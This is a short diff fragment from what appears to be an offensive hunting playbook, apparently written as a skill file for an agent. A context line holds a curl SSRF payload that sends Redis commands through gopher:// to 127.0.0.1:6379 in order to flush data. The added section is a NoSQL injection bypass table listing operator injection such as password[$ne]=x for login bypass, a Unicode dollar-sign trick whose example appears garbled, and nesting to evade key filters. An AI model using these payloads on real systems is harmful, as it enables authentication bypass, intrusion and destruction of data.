@@ -255,3 +255,33 @@ curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflush
 ```
 
 ---
+
+## Companion methodology (merged, deduplicated)
+
+Full text of every non-SKILL.md methodology file from the contributing skills — payload banks, technique references, reconnaissance and attack-class guides.
+
+### Companion: hunting / references/techniques.md
+
+# HUNT-NOSQLI — NoSQL Injection — Technique reference
+
+Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.
+
+---
+
+## Bypass Table
+
+
+
+| Defense | Bypass |
+
+|---------|--------|
+
+| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
+
+| Sanitizes `$` | Unicode: `$gt` |
+
+| Blocks operator keys | Nested objects deeper in structure |
+
+
+
+---
